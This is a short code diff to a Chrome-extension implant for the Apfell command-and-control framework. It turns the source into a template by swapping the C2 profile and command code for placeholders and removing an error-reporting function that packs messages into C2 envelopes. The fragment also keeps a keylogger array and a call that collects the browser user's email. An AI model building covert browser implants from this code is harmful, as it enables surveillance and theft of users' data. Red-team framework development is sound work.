@@ -4,7 +4,7 @@ class implant{
         this.hostinfo = "chrome";
         this.userinfo = '';
         this.procinfo = 0;
-        this.uuid = "XXXX";
+        this.uuid = "UUID_HERE";
         this.apfellid = 0;
     }
 }
@@ -65,17 +65,7 @@ let keyloggers = [];
 chrome.identity.getProfileUserInfo(function(info){
     apfell.userinfo = info.email;
 });
-
-function sendError(taskid, tasktype, err) {
-    let payload = btoa(unescape(encodeURIComponent(JSON.stringify(chrome.runtime.lastError.message))));
-    let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, payload.length, taskid, tasktype, payload);
-    const meta = {};
-    meta.type = 3;
-    meta.metadata = envelope;
-    const metaenvelope = JSON.stringify(meta);
-    out.push(metaenvelope);
-}
-
-//------------- C2Profile -------------------------------------------
-
-//-------------COMMAND DECLARATIONS AND IMPLEMENTATIONS -----------------------
+// C2 Profile Code
+C2PROFILE_HERE
+// Commands
+COMMANDS_HERE
